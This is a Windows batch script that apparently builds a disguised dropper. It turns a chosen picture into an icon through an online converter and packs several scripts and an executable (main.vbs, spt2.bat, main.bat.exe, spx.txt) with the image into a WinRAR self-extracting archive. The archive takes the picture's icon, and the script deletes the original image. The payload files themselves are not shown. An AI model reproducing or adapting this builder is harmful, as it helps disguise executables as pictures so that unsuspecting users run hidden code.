@echo on
set curldir=D:\Users\tonnyr2\curl-7.75.0-win32-mingw\bin
rem windows  10 1607 corporative 32 bit
IF [%1]==[] (
	goto :usage
)
IF [%2]==[] (
	goto :usage
)
set lockfile=%TMP%\mylock.txt
:gedulden
echo +
if exist %lockfile% (
goto :gedulden
)
echo 0 >%lockfile%

set maxbytesize=2000000
set SfXFileName=%~1
set KartinkaFail=%~2
set myscriptname=%0
set KartinkaSize=%~z2
set extension=%KartinkaFail:~-4%
set "iconFail="
if %KartinkaSize% GTR %maxbytesize% (
If not "%extension%"=="%extension:png=%" (
	set iconFail=defaultpngicon.ico
)
If not "%extension%"=="%extension:jpg=%" (
	set iconFail=defaultjpgicon.ico
)
If not "%extension%"=="%extension:jpeg=%" (
	set iconFail=defaultjpgicon.ico
)
goto :rar
) 

set iconFail=ikonka.ico


if not "%extension%"=="%extension:ico=%" (
    set iconFail=%KartinkaFail%
	goto :rar
)

set tempimage=tempimagefile
copy "%KartinkaFail%" "%tempimage%"



curl --output "%iconFail%" -L --form "image=@\"%tempimage%\"" --form "sizes[]=128" --form "name=\"key\"" --form "MAX_FILE_SIZE=9096000" --form "key=df41zr!4" https://www.icoconverter.com/index.php
timeout /T 1


If not "%extension%"=="%extension:png=%" (
IF NOT EXIST "%iconFail%" (
	set iconFail=defaultpngicon.ico
)
)
if not "%extension%"=="%extension:jpeg=%" (
if not EXIST "%iconFail%" (
	set iconFail=defaultjpgicon.ico
)
)
if not "%extension%"=="%extension:jpg=%" (

if not EXIST "%iconFail%" (
	set iconFail=defaultjpgicon.ico
)
)



:rar
"%ProgramFiles%\"WinRar\WinRAR.exe a -sfxdefault.sfx "%SfXFileName%" main.vbs spt2.bat main.bat.exe spx.txt "%KartinkaFail%" -zsfxcomment.txt -iicon"%iconFail%" -IBCK 
del %lockfile%
:rep
if EXIST "%SfXFileName%" (
	del "%KartinkaFail%"
	goto :ed
)
goto :rep

REM "%ProgramFiles%\"WinRar\Rar.exe a -sfxdefault.sfx %SfXFileName% sfxconstructror2.vbs main.vbs spt2.bat main.bat.exe spx.txt %myscriptname% "%KartinkaFail%" -zsfxcomment.txt -iicon%iconFail%
goto :ed
:usage
	echo 	%0 ^<??м'я арх?ву> ^<файл картинки>

:ed